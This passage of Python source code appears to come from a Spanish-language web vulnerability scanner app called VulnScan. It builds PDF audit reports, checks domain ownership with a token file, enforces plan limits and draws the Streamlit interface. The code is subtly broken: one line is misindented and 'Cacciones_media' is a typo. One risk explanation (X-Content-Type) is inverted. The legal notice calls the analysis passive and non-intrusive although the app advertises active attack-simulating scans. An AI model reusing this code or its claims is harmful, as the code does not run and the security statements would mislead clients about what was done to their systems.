    pdf.cell(0, 10, f"   Nivel de Riesgo Actual: {nivel_riesgo}", ln=True)
    pdf.cell(0, 10, f"   Alertas Criticas: {crit_count} | Avisos Medios: {med_count}", ln=True)
    pdf.ln(15)

    pdf.set_font("Helvetica", "B", 14)
    pdf.cell(0, 10, "Impacto de Negocio", ln=True)
    pdf.set_font("Helvetica", "", 11)
    if nota_final >= 80:
        pdf.multi_cell(0, 6, "La infraestructura muestra una postura de seguridad solida. Las configuraciones base estan aplicadas correctamente, reduciendo significativamente el riesgo de ciberataques automatizados.")
    elif nota_final >= 50:
        pdf.multi_cell(0, 6, "Se han detectado areas de mejora importantes. Aunque no hay un riesgo inminente de compromiso total, existen fugas de informacion o configuraciones debiles que un atacante motivado podria aprovechar.")
    else:
        pdf.set_text_color(220, 53, 69)
        pdf.multi_cell(0, 6, "RIESGO CRITICO. La organizacion esta expuesta a ataques severos. Se requiere intervencion tecnica inmediata para parchear las vulnerabilidades detalladas en la siguiente seccion y evitar interrupciones de negocio o fugas de datos.")
        pdf.set_text_color(0, 0, 0)

    # ==========================================
    # PÁGINA 3: DESGLOSE TÉCNICO Y EXPLICACIONES
    # ==========================================
    pdf.add_page()
    pdf.set_font("Helvetica", "B", 20)
    pdf.cell(0, 15, "2. Desglose Tecnico", ln=True)
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)

    pdf.set_font("Helvetica", "B", 14)
    pdf.set_text_color(220, 53, 69)
    pdf.cell(0, 10, "2.1 Vulnerabilidades y Areas de Riesgo", ln=True)
    pdf.set_text_color(0, 0, 0)
    
    fallos = [r for r in resultados if "🔴" in r or "🚨" in r or "⚠️" in r or "ℹ️" in r]
    if fallos:
        for malo in fallos:
            texto_limpio = malo.replace('🔴 ', '[CRITICO] ').replace('🚨 ', '[ALERTA] ').replace('⚠️ ', '').replace('ℹ️ ', '').replace('**', '').replace('`', '')
            

            # 1. Imprimimos el fallo técnico en negrita
            pdf.set_font("Helvetica", "B", 11)
            pdf.multi_cell(0, 6, texto_limpio)
            
            # 2. Imprimimos la explicación de negocio para asustar/educar (en gris y cursiva)
            pdf.set_font("Helvetica", "I", 10)
            pdf.set_text_color(100, 100, 100)
            
            if "HSTS" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Un atacante en una red Wi-Fi publica podria forzar la conexion a ser insegura e interceptar contraseñas o tarjetas de credito de sus clientes (Ataque Man-in-the-Middle).")
            elif "CSP" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Los ciberdelincuentes pueden aprovechar esto para inyectar codigo malicioso (virus o banners falsos) directamente en la pantalla de los visitantes de la web.")
            elif "X-Frame-Options" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Su web puede ser 'clonada' de forma invisible en otra pagina fraudulenta para robar clics y datos a los usuarios sin que ellos se den cuenta (Clickjacking).")
            elif "X-Content-Type" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Si un usuario sube un archivo inofensivo disfrazado de malware, su servidor podria ejecutarlo por error y ser hackeado.")
            elif "WAF" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Sin firewall de aplicaciones web, cualquier bot automatizado puede lanzar ataques de fuerza bruta, SQLi o XSS directamente contra su web sin ningun filtro.")
            elif "SQLi" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Un atacante puede extraer toda la base de datos de clientes, contrasenas y datos sensibles con un simple comando.")
            elif "XSS" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Los atacantes pueden inyectar codigo malicioso que roba sesiones de usuarios o redirige a paginas de phishing.")
            elif "SSRF" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Un atacante puede acceder a servicios internos de la red privada o robar credenciales de servicios cloud como AWS.")
            elif "Open Redirect" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Los atacantes pueden usar su dominio de confianza para redirigir usuarios a paginas de phishing, aumentando la tasa de exito del ataque.")
            elif "Permissions-Policy" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Sin esta cabecera, el navegador puede acceder a la camara, microfono o geolocalizacion del usuario sin restricciones adicionales.")
            elif "Referrer-Policy" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Las URLs internas con datos sensibles pueden filtrarse a sitios externos cuando un usuario hace clic en un enlace.")
            elif "COEP" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Vulnerable a ataques de canal lateral como Spectre que pueden leer memoria del navegador y robar datos sensibles.")
            elif "COOP" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Posible filtracion de datos entre pestanas del navegador, permitiendo a paginas maliciosas acceder a informacion de otras pestanas abiertas.")
            elif "CDN" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Sin CDN la web es mas vulnerable a ataques DDoS y tiene mayor latencia para usuarios internacionales.")
            elif "Subdominio" in texto_limpio or "subdominio" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Los subdominios de desarrollo suelen tener menos proteccion y pueden usarse como puerta de entrada a la infraestructura principal.")
            elif "Clickjacking" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Su web puede ser clonada de forma invisible en otra pagina fraudulenta para robar clics y datos a los usuarios sin que ellos se den cuenta.")
            elif "CVE" in texto_limpio and "[CRITICO]" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Vulnerabilidad CRITICA conocida publicamente. Requiere parcheo inmediato. Un atacante puede comprometer completamente el sistema sin autenticacion previa.")
            elif "CVE" in texto_limpio and "[ALTO]" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Vulnerabilidad de severidad ALTA conocida publicamente. Un atacante con conocimientos basicos puede explotar este fallo para comprometer el sistema.")
            elif "CVE" in texto_limpio and "[MEDIO]" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Vulnerabilidad de severidad MEDIA conocida. Puede ser explotada en combinacion con otros fallos para comprometer la seguridad del sistema.")
            elif "Fuzzing" in texto_limpio and ".env" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: El archivo .env esta accesible publicamente. Contiene credenciales de base de datos, API keys y secretos de la aplicacion. Riesgo critico de exposicion total.")
            elif "Fuzzing" in texto_limpio and ".git" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: El repositorio Git esta expuesto publicamente. Un atacante puede descargar el codigo fuente completo de la aplicacion.")
            elif "Fuzzing" in texto_limpio and "backup" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Archivos de backup accesibles publicamente. Pueden contener datos sensibles de la base de datos o credenciales.")
            elif "Fuzzing" in texto_limpio and "admin" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Panel de administracion accesible publicamente. Expuesto a ataques de fuerza bruta y acceso no autorizado.")
            elif "Fuzzing" in texto_limpio and "wp-config" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Archivo de configuracion de WordPress detectado. Puede contener credenciales de base de datos y claves secretas.")
            elif "Fuzzing" in texto_limpio:
                pdf.multi_cell(0, 5, "  -> Impacto real: Ruta sensible accesible publicamente. Puede revelar informacion interna del servidor o facilitar ataques dirigidos.")
            else:
                pdf.multi_cell(0, 5, "  -> Impacto real: Esta configuracion debil facilita la labor de reconocimiento a los atacantes, exponiendo la web a posibles intrusiones no deseadas.")
            
            pdf.ln(4)
            pdf.set_text_color(0, 0, 0) # Restauramos al negro para el siguiente fallo
    else:
        pdf.set_font("Helvetica", "", 11)
        pdf.multi_cell(0, 6, "[OK] No se han detectado configuraciones deficientes de nivel critico o medio en este analisis.")
        
    pdf.ln(5)
    
    pdf.set_font("Helvetica", "B", 14)
    pdf.set_text_color(25, 135, 84) # Verde
    pdf.cell(0, 10, "2.2 Controles de Seguridad Activos", ln=True)
    pdf.set_text_color(0, 0, 0)
    pdf.set_font("Helvetica", "", 11)
    
    aciertos = [r for r in resultados if "🟢" in r or "✅" in r or "válido" in r or "Abierto" in r or "Deshabilitado" in r or "no aparece" in r or "[OK]" in r]
    if aciertos:
        for bueno in aciertos:
            texto_limpio = bueno.replace('🟢', '[OK]').replace('✅', '[OK]').replace('**', '').replace('`', '')
            texto_limpio = texto_limpio.encode('latin-1', errors='ignore').decode('latin-1')
            pdf.multi_cell(0, 6, texto_limpio)
            pdf.ln(3)
    else:
        pdf.multi_cell(0, 6, "No se han detectado protecciones destacables en la configuracion perimetral externa.")

    # ==========================================
    # PÁGINA 4: PLAN DE ACCIÓN Y LEGAL
    # ==========================================
    pdf.add_page()
    pdf.set_font("Helvetica", "B", 20)
    pdf.cell(0, 15, "3. Plan de Accion y Remediacion", ln=True)
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)

    pdf.set_font("Helvetica", "", 11)
    pdf.multi_cell(0, 6, "En base a los hallazgos tecnicos documentados en este reporte, se recomienda trasladar las siguientes tareas al equipo de IT o empresa proveedora de servicios tecnologicos:")
    pdf.ln(5)

    acciones_alta = []
    acciones_media = []

    texto_resultados = " ".join(resultados)

    # Alta prioridad
    if "SSL" in texto_resultados and ("Caducado" in texto_resultados or "Error" in texto_resultados):
        acciones_alta.append("Renovar el certificado SSL/TLS de forma urgente. Los navegadores bloquean el acceso a webs con certificados caducados.")
    if "WAF" in texto_resultados and "Ausente" in texto_resultados:
        acciones_alta.append("Instalar un Web Application Firewall (WAF). Se recomienda Cloudflare (gratuito) o similar para bloquear ataques automatizados.")
    if "SQLi" in texto_resultados and "Detectado" in texto_resultados:
        acciones_alta.append("Corregir urgentemente las vulnerabilidades de inyeccion SQL detectadas. Usar consultas parametrizadas.")
    if "XSS" in texto_resultados and "Reflejado" in texto_resultados:
        acciones_alta.append("Sanitizar todos los inputs del usuario para prevenir ataques XSS.")
    if "SSRF" in texto_resultados and "Detectado" in texto_resultados:
        acciones_alta.append("Bloquear peticiones del servidor a IPs internas. Implementar lista blanca de URLs permitidas.")
    if "Lista Negra" in texto_resultados:
        acciones_alta.append("La IP del servidor esta en listas negras de spam. Contactar con el proveedor de hosting.")
    if "Open Redirect" in texto_resultados:
        acciones_alta.append("Corregir las redirecciones abiertas. Validar todas las URLs de redireccion.")
    if "Fuzzing" in texto_resultados and ".env" in texto_resultados:
        acciones_alta.append("Eliminar o proteger el archivo .env del acceso publico. Contiene credenciales criticas.")
    if "Fuzzing" in texto_resultados and ".git" in texto_resultados:
        acciones_alta.append("Bloquear el acceso publico al repositorio .git. Permite descargar el codigo fuente completo.")
    if "Fuzzing" in texto_resultados and "backup" in texto_resultados:
        acciones_alta.append("Eliminar los archivos de backup expuestos publicamente.")
    if "Fuzzing" in texto_resultados and ("backup.sql" in texto_resultados or "db.sql" in texto_resultados):
        acciones_alta.append("Eliminar dumps de base de datos expuestos publicamente de forma urgente.")
    if "Version Antigua" in texto_resultados:
        acciones_alta.append("Actualizar el software del servidor a la version mas reciente para parchear vulnerabilidades conocidas.")
    if "Base de datos expuesta" in texto_resultados:
        acciones_alta.append("Cerrar el acceso publico a los puertos de base de datos inmediatamente.")
    if "SHA-1" in texto_resultados:
        acciones_alta.append("Migrar el certificado SSL de SHA-1 a SHA-256 o superior. SHA-1 es vulnerable a ataques de colision.")
    if "Cifrado Debil" in texto_resultados or "RC4" in texto_resultados or "DES" in texto_resultados:
        acciones_alta.append("Deshabilitar los cipher suites debiles (RC4, DES) y configurar solo cifrados modernos (AES-GCM, ChaCha20).")
    if "Protocolo Obsoleto" in texto_resultados:
        acciones_alta.append("Deshabilitar TLS 1.0 y TLS 1.1 en el servidor. Solo permitir TLS 1.2 y TLS 1.3.")
    if "CVE" in texto_resultados and "[CRITICO]" in texto_resultados:
        acciones_alta.append("Parchear urgentemente las vulnerabilidades CVE CRITICAS detectadas en el software del servidor. Riesgo de compromiso total del sistema.")
    if "CVE" in texto_resultados and "[ALTO]" in texto_resultados:
        acciones_alta.append("Revisar y parchear las vulnerabilidades CVE de severidad ALTA detectadas. Consultar el portal NVD/MITRE para los parches oficiales.")

    # Media prioridad
    if "HSTS" in texto_resultados:
        acciones_media.append("Implementar la cabecera Strict-Transport-Security (HSTS) para forzar siempre HTTPS.")
    if "CSP" in texto_resultados:
        acciones_media.append("Configurar Content-Security-Policy (CSP) para prevenir inyecciones de codigo malicioso.")
    if "X-Frame-Options" in texto_resultados or "Clickjacking" in texto_resultados:
        acciones_media.append("Anadir la cabecera X-Frame-Options para proteger contra ataques de Clickjacking.")
    if "Permissions-Policy" in texto_resultados:
        acciones_media.append("Configurar Permissions-Policy para restringir el acceso del navegador a APIs sensibles.")
    if "Referrer-Policy" in texto_resultados:
        acciones_media.append("Implementar Referrer-Policy para evitar la filtracion de URLs internas.")
    if "COEP" in texto_resultados:
        acciones_media.append("Configurar Cross-Origin-Embedder-Policy para proteger contra ataques de canal lateral.")
    if "COOP" in texto_resultados:
        acciones_media.append("Configurar Cross-Origin-Opener-Policy para aislar el contexto de navegacion.")
    if "CDN" in texto_resultados and "No se detect" in texto_resultados:
        acciones_media.append("Usar un CDN como Cloudflare para mejorar la proteccion contra DDoS.")
    if "subdominio" in texto_resultados.lower() or "Subdominio" in texto_resultados:
        acciones_media.append("Revisar y securizar los subdominios de desarrollo/staging detectados.")
    if "wp-config.php" in texto_resultados and "403" in texto_resultados:
        acciones_media.append("Se detecto wp-config.php en el servidor. Aunque esta protegido (403), se recomienda moverlo fuera del directorio publico.")
    if "Email" in texto_resultados and "Expuesto" in texto_resultados:
        acciones_media.append("Ocultar los emails corporativos expuestos publicamente para reducir el riesgo de phishing dirigido.")
    if "staging" in texto_resultados.lower() or "desarrollo" in texto_resultados.lower():
        acciones_media.append("No exponer entornos de desarrollo o staging publicamente. Usar autenticacion o restringir por IP.")
    if "CVE" in texto_resultados and "[MEDIO]" in texto_resultados:
        acciones_media.append("Revisar las vulnerabilidades CVE de severidad MEDIA detectadas y aplicar parches cuando sea posible.")
    if "CVE" in texto_resultados and "[BAJO]" in texto_resultados:
        Cacciones_media.append("Tener en cuenta las vulnerabilidades CVE de severidad BAJA detectadas en futuras actualizaciones.")

    if not acciones_alta:
        acciones_alta.append("No se han detectado vulnerabilidades criticas que requieran accion inmediata.")
    if not acciones_media:
        acciones_media.append("No se han detectado vulnerabilidades medias que requieran accion a corto plazo.")

    pdf.set_font("Helvetica", "B", 12)
    pdf.cell(0, 8, "Prioridad Alta (1-3 dias):", ln=True)
    pdf.set_font("Helvetica", "", 11)
    for accion in acciones_alta:
        pdf.multi_cell(0, 6, f"- {accion}")
        pdf.ln(2)

    pdf.ln(3)
    pdf.set_font("Helvetica", "B", 12)
    pdf.cell(0, 8, "Prioridad Media (1-2 semanas):", ln=True)
    pdf.set_font("Helvetica", "", 11)
    for accion in acciones_media:
        pdf.multi_cell(0, 6, f"- {accion}")
        pdf.ln(2)

    pdf.ln(15)
    pdf.set_font("Helvetica", "B", 20)
    pdf.cell(0, 15, "4. Aviso Legal y Metodologia", ln=True)
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)
    pdf.set_font("Helvetica", "", 10)
    pdf.set_text_color(100, 100, 100)
    legal_text = (
        "Este reporte ha sido generado de forma automatizada por el motor de inteligencia de amenazas VulnScan. "
        "El analisis realizado es de naturaleza pasiva y de caja negra (OSINT), basado en informacion publica expuesta "
        "por los servidores del dominio analizado. En ningun momento se han realizado ataques intrusivos, inyecciones de codigo "
        "ni accesos no autorizados a sistemas privados.\n\n"
        "El receptor de este documento asume toda la responsabilidad sobre el uso de esta informacion. VulnScan y sus operadores "
        "no se hacen responsables de las decisiones tecnicas o de negocio tomadas a partir de este reporte."
    )
    pdf.multi_cell(0, 5, legal_text)

        output = pdf.output(dest='S')
    if isinstance(output, str):
        return output.encode('latin-1', errors='ignore')
    return bytes(output)

# --- FUNCIONES DE VERIFICACIÓN LEGAL ---

# --- FUNCIONES DE VERIFICACIÓN LEGAL ---
def generar_token(email, dominio):
    # Genera un código único que el cliente debe subir a su web
    seed = f"{email}-{dominio}-vulnscan-secret"
    return "vulnscan-" + hashlib.sha256(seed.encode()).hexdigest()[:12]

def comprobar_archivo_servidor(dominio, token_esperado):
    try:
        # Intentamos leer el archivo txt en la web del cliente
        url = f"http://{dominio}/vulnscan-auth.txt"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200 and token_esperado in resp.text:
            return True
    except:
        return False
    return False

def limite_objetivos_unicos_plan(plan):
    """Basic: 3, Pro: 25, Enterprise: sin límite."""
    if plan == "Enterprise":
        return None
    if plan == "Pro":
        return 25
    return 3

def _lista_objetivos_mes(email):
    mes = datetime.now().strftime("%Y-%m")
    od = st.session_state.get("objetivos_mes_data") or {"mes": None, "dominios": []}
    if od.get("mes") != mes:
        return mes, []
    lst = od.get("dominios") or []
    return mes, list(lst) if isinstance(lst, list) else []

def uso_objetivos_mes_texto(email, plan):
    lim = limite_objetivos_unicos_plan(plan)
    _, dominios = _lista_objetivos_mes(email)
    n = len(dominios)
    if lim is None:
        return f"Objetivos únicos este mes: **{n}** (sin límite — Enterprise)."
    return f"Objetivos únicos este mes: **{n} / {lim}** (plan {plan})."

def puede_escanear_nuevo_objetivo(email, dominio_limpio, plan):
    lim = limite_objetivos_unicos_plan(plan)
    if lim is None:
        return True, ""
    _, lista = _lista_objetivos_mes(email)
    dom = _normalizar_dominio(dominio_limpio)
    if not dom:
        return False, "Introduce un dominio válido."
    if dom in lista:
        return True, ""
    if len(lista) >= lim:
        return False, (
            f"Has alcanzado el máximo de **{lim} objetivos distintos** este mes "
            f"con el plan **{plan}**. Actualiza de plan o espera al siguiente mes."
        )
    return True, ""

def registrar_objetivo_mes_si_nuevo(email, dominio_limpio):
    if not email:
        return
    mes_actual = datetime.now().strftime("%Y-%m")
    dom = _normalizar_dominio(dominio_limpio)
    if not dom:
        return
    od = dict(st.session_state.get("objetivos_mes_data") or {"mes": None, "dominios": []})
    if od.get("mes") != mes_actual:
        od = {"mes": mes_actual, "dominios": []}
    lst = list(od.get("dominios") or [])
    if dom not in lst:
        lst.append(dom)
    od["mes"] = mes_actual
    od["dominios"] = lst
    st.session_state["objetivos_mes_data"] = od
    actualizar_usuario_supabase(email, "objetivos_mes_json", od)


def obtener_historial_cliente(email):
    if not email:
        return []
    cur = (st.session_state.get("email_usuario") or "").strip().lower()
    if cur != (email or "").strip().lower():
        return []
    return list(st.session_state.get("historial_dominios_list") or [])


def registrar_dominio_cliente(email, dominio):
    dominio_limpio = _normalizar_dominio(dominio)
    if not email or not dominio_limpio:
        return
    prev = list(st.session_state.get("historial_dominios_list") or [])
    lst = [dominio_limpio] + [d for d in prev if d != dominio_limpio]
    lst = lst[:5]
    st.session_state["historial_dominios_list"] = lst
    actualizar_usuario_supabase(email, "historial_dominios_json", lst)

# --- BARRA LATERAL ---
# Memoria para los botones rápidos del historial
if 'dominio_rapido' not in st.session_state:
    st.session_state['dominio_rapido'] = ""

if 'datos_cliente_cargados' not in st.session_state:
    st.session_state['datos_cliente_cargados'] = False

if st.session_state.get('usuario_autenticado'):
    email_actual = st.session_state.get('email_usuario', '')
    if email_actual and not st.session_state['datos_cliente_cargados']:
        cargar_perfil_usuario(email_actual)
        fecha_trial_str = st.session_state.get('fecha_inicio_trial')
        plan_memoria = st.session_state.get('plan_activo', 'Basic')
        if plan_memoria == 'Pro' and fecha_trial_str:
            try:
                fecha_trial = datetime.strptime(str(fecha_trial_str)[:10], "%Y-%m-%d")
                dias_pasados = (datetime.now() - fecha_trial).days
                if dias_pasados >= 14:
                    actualizar_usuario_supabase(email_actual, 'plan_activo', 'Basic')
            except (ValueError, TypeError):
                pass

        st.session_state['datos_cliente_cargados'] = True

with st.sidebar:
    if st.button("Cerrar Sesión"):
        try:
            # Desconecta de la nube y destruye el token de seguridad
            supabase.auth.sign_out()
        except:
            pass # Si falla por red, que siga cerrando la app visualmente
            
        st.session_state['usuario_autenticado'] = False
        st.session_state['datos_cliente_cargados'] = False
        st.session_state['plan_activo'] = 'Basic'
        st.rerun()

    # --- 1. PERFIL DINÁMICO MULTI-USUARIO ---
    correo = st.session_state.get('email_usuario', 'usuario@empresa.com')
    nombre_usuario = correo.split('@')[0].capitalize()
    iniciales = nombre_usuario[:2].upper()
    plan_usuario = st.session_state.get('plan_activo', 'Plan Básico')
    icono_plan = "💎" if plan_usuario in ['Enterprise', 'Pro'] else "🚀"

    st.markdown(f"""
        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px; padding: 12px; background-color: rgba(30, 33, 48, 0.4); border-radius: 12px; border: 1px solid #30363d;">
            <div style="background: linear-gradient(135deg, #00FFCC 0%, #00b38f 100%); width: 45px; height: 45px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-weight: bold; color: #0f111a; font-size: 1.2rem; box-shadow: 0 4px 10px rgba(0, 255, 204, 0.2);">
                {iniciales}
            </div>
            <div>
                <p style="margin: 0; font-weight: 700; font-size: 1.05rem; color: #eceff4;">{nombre_usuario}</p>
                <p style="margin: 0; font-size: 0.8rem; color: #8b949e;">{icono_plan} {plan_usuario}</p>
            </div>
        </div>
    """, unsafe_allow_html=True)

    st.markdown("<hr style='border-top: 1px solid #30363d; margin: 10px 0;'>", unsafe_allow_html=True)
    
    # --- 2. TÍTULO Y SELECTOR PREMIUM (limitado por plan) ---
    st.markdown("<p style='color: #8b949e; font-size: 0.75rem; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; margin-bottom: 10px;'>Panel de Control</p>", unsafe_allow_html=True)
    
    plan_sb = st.session_state.get('plan_activo', 'Basic')
    opciones_nivel = ["Rápido (Passive)", "Profundo (Active)", "Auditoría Completa (OWASP)"]
    nivel = st.selectbox("Nivel de Análisis", opciones_nivel, label_visibility="collapsed")

    
    
    # --- 3. CAJAS DE INFORMACIÓN ESTILO ENTERPRISE ---
    if nivel == "Rápido (Passive)":
        bg_color, border_color, titulo = "rgba(88, 166, 255, 0.1)", "#58a6ff", " Escaneo Pasivo (0 rastro)"
        desc = "Analiza fuentes públicas (OSINT), registros DNS, caducidad de SSL y reputación de IP. No interactúa de forma agresiva."
    elif nivel == "Profundo (Active)":
        bg_color, border_color, titulo = "rgba(255, 189, 69, 0.1)", "#FFBD45", " Escaneo Activo (Intrusivo)"
        desc = "Interactúa con la infraestructura. Escanea puertos abiertos, busca paneles ocultos y detecta software desactualizado."
    else:
        bg_color, border_color, titulo = "rgba(255, 75, 75, 0.1)", "#FF4B4B", " Auditoría OWASP (Completa)"
        desc = "Simula un ataque real. Prueba inyecciones SQL, XSS, bypass de WAF y vulnerabilidades complejas."

    st.markdown(f"""
        <div style="background-color: {bg_color}; border: 1px solid rgba(255,255,255,0.05); border-left: 3px solid {border_color}; border-radius: 8px; padding: 12px; margin-top: 10px; margin-bottom: 15px;">
            <p style="margin: 0 0 5px 0; color: #eceff4; font-weight: 600; font-size: 0.9rem;">{titulo}</p>
            <p style="margin: 0; color: #8b949e; font-size: 0.8rem; line-height: 1.4;">{desc}</p>
        </div>
    """, unsafe_allow_html=True)

    with st.expander("🛠️ Opciones Avanzadas"):
        st.checkbox("Escanear Subdominios", value=True)
        st.checkbox("Comprobar bypass de WAF")
        st.slider("Hilos de conexión", min_value=1, max_value=100, value=50)
        
    st.markdown("<hr style='border-top: 1px solid #30363d; margin: 15px 0;'>", unsafe_allow_html=True)
    
    # --- 4. HISTORIAL CON BOTONES ELEGANTES ---
    st.markdown("<p style='color: #8b949e; font-size: 0.75rem; font-weight: 700; letter-spacing: 1.2px; text-transform: uppercase; margin-bottom: 10px;'>Carga Rápida</p>", unsafe_allow_html=True)
    
    historial_cliente = obtener_historial_cliente(correo)
    if historial_cliente:
        for i, dominio_hist in enumerate(historial_cliente):
            if st.button(f"📄 {dominio_hist}", key=f"hist_{i}_{dominio_hist}", use_container_width=True):
                st.session_state['dominio_rapido'] = dominio_hist
                st.rerun()
    else:
        st.caption("Sin dominios recientes. Escribe uno en el Dashboard para guardarlo aquí.")
        
    st.markdown("<hr style='border-top: 1px solid #30363d; margin: 15px 0;'>", unsafe_allow_html=True)
    
    # --- 5. ESTADO DEL SISTEMA ---
    st.markdown("""
        <div style="padding-top: 5px;">
            <p style="font-size: 0.75rem; font-weight: 700; color: #8b949e; letter-spacing: 1px; margin-bottom: 8px;">ESTADO DEL SISTEMA</p>
            <p style="color: #238636; font-size: 0.8rem; margin: 0; display: flex; align-items: center; gap: 5px;">
                <span style="font-size: 8px;">🟢</span> API Operativa
            </p>
            <p style="color: #238636; font-size: 0.8rem; margin: 5px 0 0 0; display: flex; align-items: center; gap: 5px;">
                <span style="font-size: 8px;">🟢</span> CVE Database: Sync
            </p>
        </div>
    """, unsafe_allow_html=True)

# --- CABECERA ---
carpeta_actual = os.path.dirname(os.path.abspath(__file__))
archivos_logo = [f for f in os.listdir(carpeta_actual) if f.lower().startswith("logo.")]

logo_b64 = None
if archivos_logo:
    ruta_final = os.path.join(carpeta_actual, archivos_logo[0])
    with open(ruta_final, "rb") as f:
        logo_b64 = base64.b64encode(f.read()).decode()

if logo_b64:
    st.markdown(f"""
        <div style="display: flex; align-items: center; margin-bottom: 20px; position: relative; left: -100px;">
            <img src="data:image/png;base64,{logo_b64}" style="width: 300px; margin-right: -40px;">
            <div>
                <h1 style="color: #ffffff; margin: 0; font-family: 'Segoe UI', sans-serif; font-size: 2.5rem; line-height: 1.1;">VulnScan</h1>
                <p style="color: #00FFCC; margin: 5px 0 0 0; font-size: 1.1rem; font-weight: bold;">Auditoría Continua de Seguridad</p>
            </div>
        </div>
    """, unsafe_allow_html=True)
else:
    st.error("No se ha encontrado el logo.")

st.markdown("---")

# --- RESTO DE LA PÁGINA ---

# 1. CREAMOS EL MENÚ DE NAVEGACIÓN SUPERIOR 
menu_dashboard, menu_activos, menu_escaneos, menu_reportes, menu_amenazas, menu_config = st.tabs([
    "Dashboard", "Mis Activos ", "Precios", "Reportes", "Amenazas", "Configuración"
])

# ==========================================
# PESTAÑA NUEVA: MIS ACTIVOS (VERIFICACIÓN)
# ==========================================
with menu_activos:
    st.markdown("""
        <style>
            .assets-hero {
                background: linear-gradient(180deg, #161b22 0%, #121820 100%);
                border: 1px solid #30363d;
                border-radius: 14px;
                padding: 22px 22px 18px 22px;
                margin-bottom: 14px;
            }
            .assets-title {
                margin: 0;
                color: #f0f6fc;
                font-size: 1.5rem;
                font-weight: 700;
                letter-spacing: 0.2px;
            }
            .assets-subtitle {
                margin: 8px 0 0 0;
                color: #9aa4af;
                font-size: 0.98rem;
                line-height: 1.6;
            }
            .assets-card {
                background: #161b22;
                border: 1px solid #30363d;
                border-radius: 12px;
                padding: 16px 16px 10px 16px;
                margin-bottom: 10px;
            }
            .asset-domain-chip {
                background: rgba(0, 255, 204, 0.08);
                border: 1px solid rgba(0, 255, 204, 0.35);
                color: #d2fff3;
                border-radius: 10px;
                padding: 10px 12px;
                margin-bottom: 8px;
                font-size: 0.95rem;
                font-weight: 600;
                line-height: 1.4;
            }
        </style>
    """, unsafe_allow_html=True)

    st.markdown("""
        <div class="assets-hero">
            <h2 class="assets-title">Gestión de Activos y Compliance</h2>
            <p class="assets-subtitle">Por imperativo legal, debes demostrar que administras un dominio antes de realizar auditorías intrusivas.</p>
        </div>
    """, unsafe_allow_html=True)
    
    col_act1, col_act2 = st.columns([2, 1])
    
    with col_act1:
        st.markdown("<div class='assets-card'><h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'>Añadir nueva propiedad</h3></div>", unsafe_allow_html=True)
        nuevo_dominio = st.text_input("URL del dominio (ej: miproyecto.com)", placeholder="miproyecto.com")
        
        if nuevo_dominio:
            dominio_limpio = nuevo_dominio.replace("https://", "").replace("http://", "").split("/")[0]
            token = generar_token(st.session_state['email_usuario'], dominio_limpio)
            
            st.info("**Instrucciones de verificación:**")
            st.code(f"1. Crea un archivo de texto llamado: vulnscan-auth.txt\n2. Pega este código dentro: {token}\n3. Súbelo a la carpeta raíz de {dominio_limpio}", language="text")
            
            if st.button("Verificar Propiedad ahora", type="primary"):
                with st.spinner("Conectando con el servidor del cliente..."):
                    time.sleep(1.5) # Efecto dramático de búsqueda
                    if comprobar_archivo_servidor(dominio_limpio, token):
                        if dominio_limpio not in st.session_state['dominios_verificados']:
                            st.session_state['dominios_verificados'].append(dominio_limpio)
                        st.success(f"✅ ¡Éxito! El dominio {dominio_limpio} ha sido verificado legalmente.")
                        time.sleep(2)
                        st.rerun()
                    else:
                        st.error(f"❌ No se encontró el archivo en http://{dominio_limpio}/vulnscan-auth.txt o el código es incorrecto.")
                        
    with col_act2:
        st.markdown("<div class='assets-card'><h3 style='margin:0; color:#f0f6fc; font-size:1.12rem;'> Propiedades Verificadas</h3></div>", unsafe_allow_html=True)
        if len(st.session_state['dominios_verificados']) == 0:
            st.warning("Aún no tienes ningún dominio verificado.")
        else:
            for dom in st.session_state['dominios_verificados']:
                st.markdown(f"<div class='asset-domain-chip'>🟢 {dom}</div>", unsafe_allow_html=True)

# ==========================================
# PESTAÑA 1: DASHBOARD (Escáner Principal)
# ==========================================
with menu_dashboard:
    # INICIALIZACIÓN DE LA BILLETERA DE TOKENS
    if 'tokens_pro' not in st.session_state:
        st.session_state['tokens_pro'] = 0
    if 'tokens_ent' not in st.session_state:
        st.session_state['tokens_ent'] = 0

    st.markdown("""
    <style>
        html, body, [data-testid="stAppViewContainer"], [data-testid="stMain"] {
            background-color: #0b0e14 !important;
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif !important;
        }
        .dashboard-hero {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 30px;
